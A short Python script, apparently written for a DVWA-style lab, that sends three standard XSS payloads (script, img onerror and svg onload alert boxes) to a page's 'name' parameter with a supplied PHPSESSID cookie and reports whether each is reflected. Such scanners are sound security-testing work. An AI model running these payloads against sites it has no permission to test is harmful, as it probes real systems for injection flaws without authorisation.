import requests
from urllib.parse import urlencode, quote_plus
import sys

# List of XSS payloads to test
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
]

# Base URL of the web application (replace with the actual URL)
# base_url = "http://localhost/vulnerabilities/xss_r/"

# cookies = {
#     "PHPSESSID": "r0gb7ua840v3i1jmun8o2t2re3",
# }

def url_construct(base_url, payload):
    enc_payload = quote_plus(payload, safe='')
    url = base_url+"?"+"name="+enc_payload+"#"
    # print(url)
    return url

def test_reflected_xss(session, url, payload, cookies):
    # params = {"name": payload}
    # full_url = f"{url}?{urlencode(params)}#"
    full_url = url_construct(url, payload)
    # print(urlencode(params))
    # print(url)
    # print(payload)
    # print(full_url)
    response = session.get(full_url, cookies=cookies)
    # print(str(response.text))
    # exit(0)
    
    # Check if the payload is reflected in the response
    if payload in response.text:
        print(f"Reflected XSS found with payload: {payload}")
    else:
        print(f"No reflected XSS found with payload: {payload}")

def main():
    base_url = sys.argv[1]
    cookies = {
        "PHPSESSID": sys.argv[2],
    }
    session = requests.Session()

    for payload in xss_payloads:
        # print(f"Testing payload: {payload}")
        test_reflected_xss(session, f'{base_url}', payload, cookies)

if __name__ == "__main__":
    main()
    # url_construct("http://localhost/vulnerabilities/xss_r/", xss_payloads[0])
    exit(0)
